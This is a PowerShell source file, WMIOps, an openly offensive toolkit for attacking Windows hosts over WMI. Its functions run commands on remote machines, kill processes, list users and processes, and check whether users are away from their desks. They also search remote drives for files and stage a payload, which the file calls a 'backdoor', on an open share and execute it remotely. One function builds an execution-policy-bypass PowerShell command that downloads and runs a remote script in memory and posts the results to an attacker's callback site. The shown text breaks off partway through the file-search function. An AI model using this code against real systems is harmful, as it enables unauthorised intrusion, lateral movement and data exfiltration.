#requires -version 2

<#
    WMIOps v1.2
    License: GPLv3
    Author: @ChrisTruncer
#>

function Invoke-ExecCommandWMI
{
    <#
    .SYNOPSIS
    This function is used to run a command/start a process on either the local or a remote machine.  This requires local admin access wherever the command is to be executed.

    .DESCRIPTION
    This function is used to run a command/start a process on either the local or a remote machine.  This can be used to simply ping a machine, run an executable, or run any command in the target's system path.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Command
    Specify the command that is executed on the targeted machine.

    .EXAMPLE
    > Invoke-ExecCommandWMI -Command ping -n 4 192.168.1.1
    This pings the system at 192.168.1.1 with 4 ping requests from the local system

    .EXAMPLE
    > cat hostnames.txt | Invoke-ExecCommandWMI -Command notepad.exe -User Chris -Pass password
    This command receives hostnames to target from the pipeline, authenticates to them, and starts notepad.exe

    .LINK
    https://github.com/xorrior/RandomPS-Scripts
    
    #>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$Targets = ".",
        [Parameter(Mandatory = $True)] 
        [string]$Command
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $cred -Computername $computer
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            # user didn't enter creds. Assume using local user priv has local admin access to Targets
            # Thanks Evan for catching this
            Foreach($computer in $TARGETS)
            {
                Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Computername $computer
            }
        }

        else
        {
            # If this area of code is invoked, it runs the command on the same machine the script is loaded
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command
        }
        
    }

    end{}
}


function Invoke-KillProcessWMI
{
<#
    .SYNOPSIS
    This function is used to kill a process on either the local or a remote machine via a process name or ID.  This requires local admin access wherever the command is to be executed.

    .DESCRIPTION
    This function is used to kill a process on either the local or a remote machine via a process name or ID.  This requires local admin rights.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER ProcessName
    Specify the name of the process that is to be killed on the targeted machine.

    .PARAMETER ProcessID
    Specify the process ID number that is to be killed on the targeted machine.

    .EXAMPLE
    > Invoke-WMIKillProcess -ProcessName notepad.exe
    This kills all processes with the name notepad.exe on the local machine

    .EXAMPLE
    > Invoke-WMIKillProcess -ProcessID 2048 -User Chris -Pass password -Target chrispc
    This command authenticates to chrispc and and attempts to kill the process with pid 2048.

    .LINK
    https://github.com/xorrior/RandomPS-Scripts
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ParameterSetName='name')] 
        [string]$ProcessName,
        [Parameter(Mandatory = $False, ParameterSetName='id')] 
        [string]$ProcessID,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = "."
    )

    Process
    {
        if($User -and $Pass)
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password

            if($ProcessName)
            {
                ForEach($computer in $TARGETS)
                {
                    Write-Verbose "Killing process via process name"
                    Get-WmiObject -Class win32_Process -Credential $cred -Computername $computer -Filter "name = '$ProcessName'" | ForEach-Object { $_.Terminate() }
                }
            }

            elseif($ProcessID)
            {
                ForEach($computer in $TARGETS)
                {
                    Write-Verbose "Killing process via process ID"
                    Get-WmiObject -Class win32_Process -Credential $cred -Computername $computer -Filter "ProcessID = '$ProcessID'" | ForEach-Object { $_.Terminate() }
                }
            }

            else
            {
                Write-Verbose "You didn't provide a valid action to take! This script uses processid or processname!"
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            if($ProcessName)
            {
                Get-WmiObject -Class win32_Process -Computername $computer -Filter "name = '$ProcessName'" | ForEach-Object { $_.Terminate() }
            }

            elseif($ProcessID)
            {
                Get-WmiObject -Class win32_Process -Computername $computer -Filter "ProcessID = '$ProcessID'" | ForEach-Object { $_.Terminate() }
            }

            else
            {
                Write-Verbose "You didn't provide a valid action to take! This script uses processid or processname!"
            }
        }

        else
        {
            if($ProcessName)
            {
                Get-WmiObject -Class win32_Process -Filter "name = '$ProcessName'" | ForEach-Object { $_.Terminate() }
            }

            elseif($ProcessID)
            {
                Get-WmiObject -Class win32_Process -Filter "ProcessID = '$ProcessID'" | ForEach-Object { $_.Terminate() }
            }

            else
            {
                Write-Verbose "You didn't provide a valid action to take! This script uses processid or processname!"
            }
        }
    }

    end{}
}

function Get-RunningProcessesWMI
{
<#
    .SYNOPSIS
    This function is used to get a list of all processes running on a local or remote system.

    .DESCRIPTION
    This function is used to obtain a list of all running processes on a local or a remote machine.  This requires local admin rights.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .EXAMPLE
    > Get-RunningProcesses -User Chris -Pass password -Targets win7workstation
    This attempts to authenticate to win7workstation with the Chris account and password to get a list of running processes.

    .EXAMPLE
    > Get-RunningProcesses
    This will obtain a list of running processes from the local machine.

    .Example
    > Get-RunningProcesses -Targets win7workstation
    This will attempt to authenticate to the win7workstation machine with the current account to obtain a list of running processes.

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2009/12/10/hey-scripting-guy-december-10-2009.aspx
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = "."
    )

    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                Write-Verbose "Connecting to $computer"
                Get-WMIObject Win32_Process -Credential $cred -computername $computer | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            Foreach($computer in $TARGETS)
            {
                Write-Verbose "Connecting to $computer"
                Get-WMIObject Win32_Process -computername $computer | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
            }
        }

        else
        {
            Write-Verbose "Checking local system..."
            Get-WMIObject Win32_Process | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
        }
    }
}

function Get-ProcessOwnersWMI
{
<#
    .SYNOPSIS
    This function is used to get a list of all users that have running processes on a local or remote system.

    .DESCRIPTION
    This function is used to get a list of all users that have running processes on a local or remote system.  This requires local admin rights.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .EXAMPLE
    > Get-ProcessOwners -User Chris -Pass password -Targets win7workstation
    This attempts to authenticate to win7workstation with the Chris account and password to get a list of user accounts which have running processes on the remote machine.

    .EXAMPLE
    > Get-ProcessOwners
    This will obtain a list of user accounts which have running processes on the local machine.

    .Example
    > Get-ProcessOwners -Targets win7workstation
    This will attempt to authenticate to the win7workstation machine with the current account to obtain a list of user accounts which have running processes on the remote machine.

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2009/12/10/hey-scripting-guy-december-10-2009.aspx
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = "."
    )

    Process
    {
        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                Write-Verbose "Connecting to $computer"{$_.getowner().user}
                Get-WMIObject Win32_Process -Credential $cred -computername $computer | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            Foreach($computer in $TARGETS)
            {
                Write-Verbose "Connecting to $computer"
                Get-WMIObject Win32_Process -computername $computer | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
            }
        }

        else
        {
            Write-Verbose "Checking local system..."
            Get-WMIObject Win32_Process | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
        }
    }
}


function Find-ActiveUsersWMI
{
<#
    .SYNOPSIS
    This function is used to determine if a user is actively at the targeted workstation or server.

    .DESCRIPTION
    This function is used to determine if a user is actively at the targeted workstation or server.  It looks to see if LogonUi.exe or a .scr (screensaver) process is running on the targeted machine.  This requires local admin rights.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER Away
    Checks if screen is locked or screen saver is active.

    .PARAMETER Empty
    Checks if user is logged into system at all.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Usernames
    Enumerate usernames that are active on the system

    .EXAMPLE
    > Find-ActiveUsersWMI -User Chris -Pass password -Targets win7workstation -Empty
    This attempts to authenticate to win7workstation with the Chris account and password to see if a user is logged into the system at all.

    .EXAMPLE
    > Get-Content C:\ips.txt | Find-ActiveUsersWMI -Away
    This will read in IPs, pass them into ActiveUsers, and then see if the user is away (by screensaver detection or locked screen).

    .Example
    > Query-UsersActive -Targets win7workstation -Empty -Away
    This will attempt to authenticate to the win7workstation machine with the current account to see if the computer is locked, or screen saver is active.  It will also see if a user is logged into the system at all.

    .LINK
    http://www.activxperts.com/admin/scripts/wmi/powershell/0388/
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $False)] 
        [switch]$Away,
        [Parameter(Mandatory = $False)] 
        [switch]$Empty,
        [Parameter(Mandatory = $False)] 
        [switch]$Usernames
    )
    # Thanks to Evan Pena for helping to get this added with username enumeration and troubleshooting
    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                # Need to add in filtering here to stop if a "true" has been found for screensavers being active
                Write-Verbose "Connecting to $computer"
                
                if($Away)
                {
                    $all_processes = Get-RunningProcessesWMI -User $User -Pass $Pass -Targets $computer
                    $ScreenshotActive = $all_processes | Select-String ".scr"
                    $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

                    # If either returned true, we can assume the user is not active at their desktop
                    if ($ScreenshotActive -or $LoginPrompt)
                    {
                        Write-Output "User is not present at $computer!"
                    }
                    else
                    {
                        Write-Output "User is at present at $computer!"
                    }
                }
                if($Empty)
                {
                    try
                    {
                        $user = $null
                        $user = Get-WmiObject -Class win32_computersystem -ComputerName $computer -Credential $cred -ErrorAction Stop | select -ExpandProperty username
                    }
                    catch
                    { 
                        $message = $_.Exception.Message
                        if($message -like '*not process argument because*')
                        {
                            $computer
                        }
                        elseif($message -like '*RPC server is unavailable*')
                        {
                            Write-Verbose "Cannot connect to $computer"
                        }
                    }
                }
                if($Usernames)
                {
                    $user = $null
                    try
                    {
                        $user = Get-WmiObject -Class win32_computersystem -ComputerName $computer -Credential $cred -ErrorAction Stop | select -ExpandProperty username
                        $user
                    }
                    catch 
                    {
                        # This is used to just catch the exception and ignore it, since I only care about live users
                    }
                    $system_process_accounts = Get-ProcessOwnersWMI -User $User -Pass $Pass -Targets $computer
                    foreach($user_name in $system_process_accounts) { if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) { "$user_name is active on $computer" } }
                }
            }
        }

        elseif(($Targets -ne ".") -and !$User)
        {
            Foreach($computer in $TARGETS)
            {
                # Need to add in filtering here to stop if a "true" has been found for screensavers being active
                Write-Verbose "Connecting to $computer"
                
                if($Away)
                {
                    $all_processes = Get-RunningProcessesWMI -User $User -Pass $Pass -Targets $computer
                    $ScreenshotActive = $all_processes | Select-String ".scr"
                    $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

                    # If either returned true, we can assume the user is not active at their desktop
                    if ($ScreenshotActive -or $LoginPrompt)
                    {
                        Write-Output "User is not present at $computer!"
                    }
                    else
                    {
                        Write-Output "User is at present at $computer!"
                    }
                }
                if($Empty)
                {
                    try
                    {
                        $user = $null
                        $user = Get-WmiObject -Class win32_computersystem -ComputerName $computer -ErrorAction Stop | select -ExpandProperty username
                    }
                    catch
                    { 
                        $message = $_.Exception.Message
                        if($message -like '*not process argument because*')
                        {
                            $computer
                        }
                        elseif($message -like '*RPC server is unavailable*')
                        {
                            Write-Verbose "Cannot connect to $computer"
                        }
                    }
                }
                if($Usernames)
                {
                    $user = $null
                    try
                    {
                        $user = Get-WmiObject -Class win32_computersystem -ComputerName $computer -ErrorAction Stop | select -ExpandProperty username
                        $user
                    }
                    catch 
                    {
                        # This is used to just catch the exception and ignore it, since I only care about live users
                    }
                    $system_process_accounts = Get-ProcessOwnersWMI -User $User -Pass $Pass -Targets $computer
                    foreach($user_name in $system_process_accounts) { if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) { "$user_name is active on $computer" } }
                }
            }
        }

        else
        {
            # Need to add in filtering here to stop if a "true" has been found for screensavers being active
            Write-Verbose "Connecting to $computer"
            
            if($Away)
            {
                $all_processes = Get-RunningProcessesWMI
                $ScreenshotActive = $all_processes | Select-String ".scr"
                $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

                # If either returned true, we can assume the user is not active at their desktop
                if ($ScreenshotActive -or $LoginPrompt)
                {
                    Write-Output "User is not present at $computer!"
                }
                else
                {
                    Write-Output "User is at present at $computer!"
                }
            }
            if($Empty)
            {
                try
                {
                    $user = $null
                    $user = Get-WmiObject -Class win32_computersystem -ErrorAction Stop | select -ExpandProperty username
                }
                catch
                { 
                    $message = $_.Exception.Message
                    if($message -like '*not process argument because*')
                    {
                        $computer
                    }
                    elseif($message -like '*RPC server is unavailable*')
                    {
                        Write-Verbose "Cannot connect to $computer"
                    }
                }
            }
            if($Usernames)
            {
                $user = $null
                try
                {
                    $user = Get-WmiObject -Class win32_computersystem -ErrorAction Stop | select -ExpandProperty username
                    $user
                }
                catch 
                {
                    # This is used to just catch the exception and ignore it, since I only care about live users
                }
                $system_process_accounts = Get-ProcessOwnersWMI -User $User -Pass $Pass -Targets $computer
                foreach($user_name in $system_process_accounts) { if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) { "$user_name is active on this system!" } }
            }
        }
    }
}


function Invoke-CreateShareandExecute
{
<#
    .SYNOPSIS
    This function is uses WMI and SMB to run a file on a remote system without dropping it to disk.

    .DESCRIPTION
    This function will need to be run from an elevated command prompt.  It creates a share on your local system and copies the file you want to run into the share.  After permissions have been set for "Everyone" to access, the function uses WMI to net use the share and run the file.  After it's been executed, the function removes the share.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER PayloadPath
    The path to the executbale you want run on a remote system.

    .PARAMETER SharePath
    The path to the directory that will be setup as a share.

    .EXAMPLE
    > Invoke-CreateShareandExecute -User Chris -Pass password -Targets win7workstation -SharePath C:\Users\test1\Desktop\test -PayloadPath C:\runme.exe
    This command will copy runme.exe into the sharepath provided, setup a share and modify permissions so the runme.exe can be executed remotely.  The function then uses WMI to net use the share with the credentials provided and then run the runme.exe file.  Upon execution, the file copied into the share is deleted and the share is removed.

    .Example
    > Invoke-CreateShareandExecute -Targets win7workstation -SharePath C:\Users\test1\Desktop\apple -PayloadPath C:\run.bat
    This command will copy runme.exe into the sharepath provided, setup a share and modify permissions so the runme.exe can be executed remotely.  The function then uses WMI to net use the share within the context of the current user and then run the runme.exe file.  Upon execution, the file copied into the share is deleted and the share is removed.

    .LINK
    http://windowsitpro.com/powershell/managing-file-shares-windows-powershell
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [string]$User,
        [Parameter(Mandatory = $False)]
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $True)]
        [string]$PayloadPath,
        [Parameter(Mandatory = $True)]
        [string]$SharePath
    )

    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                # First, check to make sure path exists that user wants to share
                $SharePathExists = Test-Path $SharePath
                if (!$SharePathExists)
                {
                    Write-Verbose "Directory that you want to share does not exist!"
                    Return
                }

                # Check if file already exists at share location
                $Delimeter = "\\"
                $PayloadName = $PayloadPath.Split($Delimeter)[-1]
                $SharePayloadPath = Join-Path $SharePath $PayloadName
                $SharePayloadExists = Test-Path $SharePayloadPath

                # If payload is not in share location, copy it there
                if ($SharePayloadExists -eq $FALSE)
                {
                    Copy-Item $PayloadPath $SharePath
                }

                # Set permissions on the folder itself
                $acl = Get-Acl $SharePath
                $mod = New-Object system.security.accesscontrol.filesystemaccessrule("Everyone", "ReadAndExecute", "Allow")
                $acl.SetAccessRule($mod)
                Set-Acl $SharePath $acl

                # Set Permissions on payload in share directory
                $fileacl = Get-Acl $SharePayloadPath
                $filemod = New-Object system.security.accesscontrol.filesystemaccessrule("Everyone", "ReadAndExecute", "Allow")
                $fileacl.SetAccessRule($filemod)
                Set-Acl $SharePayloadPath $fileacl

                # Set the permissions for the share (currently read only, but can be changed by modifying one line)
                $trustee = ([wmiclass]'Win32_trustee').psbase.CreateInstance()
                $trustee.Domain = ""
                $trustee.Name = ""
                $fullcontrol = 2032127
                $read = 1179785
                $ace = ([wmiclass]'Win32_ACE').psbase.CreateInstance()
                $ace.AccessMask = $read
                $ace.AceFlags = 3
                $ace.AceType = 0
                $ace.Trustee = $trustee
                $sd = ([wmiclass]'Win32_SecurityDescriptor').psbase.CreateInstance()
                $sd.ControlFlags = 4
                $sd.DACL = $ace
                $sd.group = $trustee
                $sd.owner = $trustee

                # Create the share
                (Get-WmiObject Win32_share -List).Create($SharePath, "SystemShare", 0, 2, "", "", $sd)

                $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
                $ExecFullCommand = "cmd.exe /C ""net use v: \\" + $SystemHostname + "\SystemShare /user:$user $Pass & \\" + $SystemHostname + "\SystemShare\" + $PayloadName + """"
                # http://stackoverflow.com/questions/14345972/powershell-invoke-wmimethod-to-create-a-sharefolder-remotely-with-full-control/14346750#14346750
                
                Write-Verbose "Executing the payload via WMI on remote system..."
                Invoke-ExecCommandWMI -User $User -Pass $Pass -Targets $computer -Command $ExecFullCommand
                
                Write-Verbose "Sleeping for 7 seconds to let command execute..."
                Start-Sleep -s 7

                Write-Verbose "Removing the share that was created"
                if ($share = Get-WmiObject -Class Win32_Share -ComputerName $SystemHostname -Filter "Name='SystemShare'") `
                    { $share.delete() }

                Write-Verbose "Removing backdoor from old share"
                Remove-Item $SharePayloadPath
                Write-Verbose "Done!"
            }
        }

        else
        {
            Write-Verbose "You didn't provide a username or password to connect to a remote system!"
        }
    }
}

function Invoke-RemoteScriptWithOutput
{
<#
    .SYNOPSIS
    This function will use wmi to invoke powershell, download a powershell script in memory, and post its output back to a system you specify.

    .DESCRIPTION
    This function will use wmi to invoke powershell, download a powershell script in memory, and post its output back to a system you specify.  You will want to use the included https server (python).

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER URL
    The URL to the powershell script that will be downloaded and run.

    .PARAMETER Function
    The function name that should run on the remote system.

    .PARAMETER CallbackSite
    The IP or domain to post the results back to.

    .EXAMPLE
    > Invoke-RemoteScriptWithOutput -User Chris -Pass password -Targets win7workstation -Url https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1 -Function Invoke-ExecCommandWMI -CallbackSite www.callbackdomain.com
    This command downloads the WMIOps powershell script, runs the invoke-execcommandwmi function, and posts the output back to the specified domain (where the python server is running)

    .LINK
    http://blogs.technet.com/b/heyscriptingguy/archive/2009/12/10/hey-scripting-guy-december-10-2009.aspx
    https://github.com/PowerShellEmpire/PowerTools/blob/master/PewPewPew/Invoke-MassMimikatz.ps1
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $False)] 
        [string]$Url,
        [Parameter(Mandatory = $False)] 
        [string]$Function,
        [Parameter(Mandatory = $False)] 
        [string]$CallbackSite
    )

    Process
    {

        if($User -and $Pass)
        {
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
            Foreach($computer in $TARGETS)
            {
                Write-Verbose "Connecting to $computer"

                [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

                $Command = 'powershell -nop -exec bypass -c "$wc = New-Object System.Net.Webclient; $wc.Headers.Add(''User-Agent'',''Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko''); $wc.proxy=[System.Net.WebRequest]::DefaultWebProxy; $wc.proxy.credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials; Invoke-Expression ($wc.downloadstring('
                $Command += "'$Url'"
                $Command += ')); $output = '
                $Command += "$Function;"
                $Command += '$postback = '
                $Command += "'https://$CallbackSite/testpost.php';"
                $Command += '$uri = New-Object -TypeName System.Uri -ArgumentList $postback; $finaloutput = Out-String -InputObject $output; [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; $wcc = New-Object -TypeName System.Net.WebClient; $wcc.UploadString($uri, $finaloutput)'

                Write-Verbose "Running command on remote system..."

                Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $cred -Computername $Targets

                Write-Verbose "Command running!"
            }
        }
    }
}

function Find-UserSpecifiedFileWMI
{
<#
    .SYNOPSIS
    This function uses wmi to search for files on the target system.

    .DESCRIPTION
    This function uses wmi to search for files on the target system.  The user can provide a file, or an extension, and this will search the specified drive for the file or all files with the provided extension.

    .PARAMETER User
    Specify a username. Default is the current user context.

    .PARAMETER Pass
    Specify the password for the appropriate user.

    .PARAMETER TARGETS
    Host or array of hosts to target. Can be a hostname, IP address, or FQDN. Default is set to localhost.

    .PARAMETER Drive
    The drive to search.  Ex: C:

    .PARAMETER Extension
    The file extension to search for, can use wildcards.

    .PARAMETER File
    The file to search for, can use wildcards.

    .EXAMPLE
    > Search-UserSpecifiedFile -User Chris -Pass password -Targets win7workstation -Drive C: -File *est.txt
    This command will search the win7workstation's C drive for any file matching the wildcard *est.txt

    .Example
    > Search-UserSpecifiedFile -Targets win7workstation -Drive C: -Extension sql
    This command will use the current user's credentials to search the C drive of the win7workstation for all files with a "sql" extension.

    .LINK
    http://powershell.org/wp/2013/01/29/find-files-with-wmi-and-powershell/
#>

    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)] 
        [string]$User,
        [Parameter(Mandatory = $False)] 
        [string]$Pass,
        [Parameter(Mandatory = $False, ValueFromPipeLine=$True)] 
        [string[]]$TARGETS = ".",
        [Parameter(Mandatory = $True)] 
        [string]$Drive,
        [Parameter(Mandatory = $False, ParameterSetName='extension')] 
        [string[]]$Extension,
        [Parameter(Mandatory = $False, ParameterSetName='filename')] 
        [string[]]$File
    )

    process
    {
        # Check length of drive, only want first two characters
        if($Drive.length -gt 2)
        {
            $Drive = $Drive.substring(0,2)
        }

        elseif($Drive.length -lt 2)
        {
            Throw "Drive needs two character EX: C:"
        }

        if(($User -and $Pass) -and ($Targets -ne "."))
        {
            # This block of code is executed when starting a process on a remote machine via wmi
            $password = ConvertTo-SecureString $Pass -asplaintext -force 
            $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password

            Foreach($computer in $TARGETS)
            {
                if($File)
                {
                    $counter = 0
                    $filter = "Filename"
                    foreach($incoming_file in $File)
                    {
                        if($counter -gt 0)
                        {
                            $filter += "OR Filename"
                        }

                        if($incoming_file.Contains("."))
                        {
                            #get the index of the last .
                            $index = $incoming_file.LastIndexOf(".")
                            #get the first part of the name
                            $filename = $incoming_file.Substring(0,$index)
                            #get the last part of the name
                            $extension = $incoming_file.Substring($index+1)

                            if($filename -match "\*")
                            {
                                $filename = $filename.Replace("*","%")
                                $filter += " LIKE '$filename' "
                            }
                            else
                            {
                                $filter += " = '$filename' "
                            }

                            if ($extension -match "\*")
                            {
                                $extension = $extension.Replace("*","%")
                                $filter += "AND Extension LIKE '$extension' "
                            }
                            else 
                            {
                                $filter += "AND Extension = '$extension' "
                            }
                            
                        }
                        else
                        {
                            if($incoming_file -match "\*")
                            {
                                $filename = $incoming_file.Replace("*","%")
                                $filter += " LIKE '$filename' "
                            }
                            else
                            {
                                $filter += " = '$incoming_file' "
                            }
                        }
                        $counter += 1
                    }
                }

                else
                {
                    $counter = 0
                    $filter = "Extension"
                    foreach($ext in $extension)
                    {
                        if($counter -gt 0)
                        {
                            $filter += "OR Extension"
                        }

                        if ($ext -match "\*")
                        {
                            $ext = $ext.Replace("*","%")
                            $filter += " LIKE '$ext' "
                        }
                        else 
                        {
                            $filter += " = '$ext' "
                        }
                        $counter += 1
                    }
                }
            }
            $filter += "AND Drive='$drive'"
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $computer -Credential $cred
        }
        elseif(($Targets -ne ".") -and !$User)
        {
            Foreach($computer in $TARGETS)
            {
                if($File)
                {
                    $counter = 0
                    $filter = "Filename"
                    foreach($incoming_file in $File)
                    {
                        if($counter -gt 0)
                        {
                            $filter += "OR Filename"
                        }

                        if($incoming_file.Contains("."))
                        {
                            #get the index of the last .
                            $index = $incoming_file.LastIndexOf(".")
                            #get the first part of the name
                            $filename = $incoming_file.Substring(0,$index)
                            #get the last part of the name
                            $extension = $incoming_file.Substring($index+1)

                            if($filename -match "\*")
                            {
                                $filename = $filename.Replace("*","%")
                                $filter += " LIKE '$filename' "
                            }
                            else
                            {
                                $filter += " = '$filename' "
                            }

                            if ($extension -match "\*")
                            {
                                $extension = $extension.Replace("*","%")
                                $filter += "AND Extension LIKE '$extension' "
                            }
                            else 
                            {
                                $filter += "AND Extension = '$extension' "
                            }
                            
                        }
                        else
                        {
                            if($incoming_file -match "\*")
                            {
                                $filename = $incoming_file.Replace("*","%")
                                $filter += " LIKE '$filename' "
                            }
                            else
                            {
                                $filter += " = '$incoming_file' "
                            }
                        }
                        $counter += 1
                    }
                }

                else
                {
                    $counter = 0
                    $filter = "Extension"
                    foreach($ext in $extension)
                    {
                        if($counter -gt 0)
                        {
                            $filter += "OR Extension"
                        }

                        if ($ext -match "\*")
                        {
                            $ext = $ext.Replace("*","%")
                            $filter += " LIKE '$ext' "
                        }
                        else 
                        {
                            $filter += " = '$ext' "
                        }
                        $counter += 1
                    }
                }
            }
            $filter += "AND Drive='$drive'"
            Get-WmiObject -Class cim_datafile -filter $filter -ComputerName $computer
        }
        else 
        {
            if($File)
            {
                $counter = 0
                $filter = "Filename"
                foreach($incoming_file in $File)
                {
                    if($counter -gt 0)
                    {
                        $filter += "OR Filename"
                    }

                    if($incoming_file.Contains("."))
                    {
                        #get the index of the last .
                        $index = $incoming_file.LastIndexOf(".")
                        #get the first part of the name
                        $filename = $incoming_file.Substring(0,$index)
                        #get the last part of the name
                        $extension = $incoming_file.Substring($index+1)

                        if($filename -match "\*")
                        {
                            $filename = $filename.Replace("*","%")
                            $filter += " LIKE '$filename' "
                        }
                        else
                        {
                            $filter += " = '$filename' "
                        }

                        if ($extension -match "\*")
                        {
                            $extension = $extension.Replace("*","%")
                            $filter += "AND Extension LIKE '$extension' "
                        }
                        else 
                        {
                            $filter += "AND Extension = '$extension' "
                        }
                        
                    }
                    else
                    {
                        if($incoming_file -match "\*")
                        {
                            $filename = $incoming_file.Replace("*","%")
                            $filter += " LIKE '$filename' "
                        }
                        else
                        {
                            $filter += " = '$incoming_file' "
                        }
                    }
                    $counter += 1
                }
            }

            else
            {
                $counter = 0
                $filter = "Extension"
                foreach($ext in $extension)
                {
                    if($counter -gt 0)
                    {
                        $filter += "OR Extension"
                    }

                    if ($ext -match "\*")
                    {
                        $ext = $ext.Replace("*","%")
